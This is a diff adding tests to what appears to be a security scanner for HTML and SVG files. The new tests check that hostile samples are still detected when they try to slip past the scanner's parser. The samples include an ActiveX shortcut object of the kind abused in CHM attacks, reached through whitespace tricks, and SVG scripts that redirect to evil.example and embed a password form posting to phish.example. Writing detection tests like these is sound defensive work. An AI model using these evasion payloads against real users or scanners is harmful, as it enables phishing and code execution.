@@ -1101,3 +1101,43 @@ def test_math_annotation_xml_html_ip_treats_mglyph_malignmark_as_html(tmp_path: 
             "</body></html>"
         ).encode()
         assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, f"ann_{tag}.html", payload))
+
+
+def test_html5_non_ascii_whitespace_does_not_terminate_script_or_rawtext_tags(tmp_path: Path):
+    """r15 Blocker 1: \\x0b and \\xa0 are NOT HTML5 tag-name terminators."""
+    for idx, ws in enumerate(("\x0b", "\xa0")):
+        script_bypass = (
+            f"<!DOCTYPE html><html><body><script><!--<script{ws}</script>"
+            '<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+            '<param name="Command" value="ShortCut"></object></body></html>'
+        ).encode()
+        assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, f"ws_script_{idx}.html", script_bypass))
+
+        rawtext_bypass = (
+            f'<!DOCTYPE html><html><body><style></style{ws} a="</style>'
+            '<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+            '<param name="Command" value="ShortCut"></object></body></html>'
+        ).encode()
+        assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, f"ws_style_{idx}.html", rawtext_bypass))
+
+
+def test_xml_svg_script_cdata_and_comment_containing_closing_script(tmp_path: Path):
+    """r15 Major 2: literal </script> inside SVG CDATA/comment must not close <script>."""
+    svg_cdata = (
+        b'<svg xmlns="http://www.w3.org/2000/svg">'
+        b'<script><![CDATA[ var x = "</script><a x=\'"; '
+        b"window.location = 'https://evil.example'; ]]></script>"
+        b'<foreignObject><form action="https://phish.example"><input type="password"/></form></foreignObject>'
+        b"<!-- ' --></svg>"
+    )
+    ids = _rule_ids(_scan(tmp_path, "svg_cdata_close.svg", svg_cdata))
+    assert {"SVG_SCRIPT", "SVG_EXTERNAL_REDIRECT", "SVG_FOREIGN_OBJECT", "HTML_CREDENTIAL_FORM"} <= ids
+
+    svg_comment = (
+        b'<svg xmlns="http://www.w3.org/2000/svg">'
+        b'<script><!-- </script><a x=\' -->window.location="https://evil.example";</script>'
+        b'<foreignObject><form action="https://phish.example"><input type="password"/></form></foreignObject>'
+        b"<!-- ' --></svg>"
+    )
+    ids_c = _rule_ids(_scan(tmp_path, "svg_cmt_close.svg", svg_comment))
+    assert {"SVG_SCRIPT", "SVG_EXTERNAL_REDIRECT", "SVG_FOREIGN_OBJECT", "HTML_CREDENTIAL_FORM"} <= ids_c
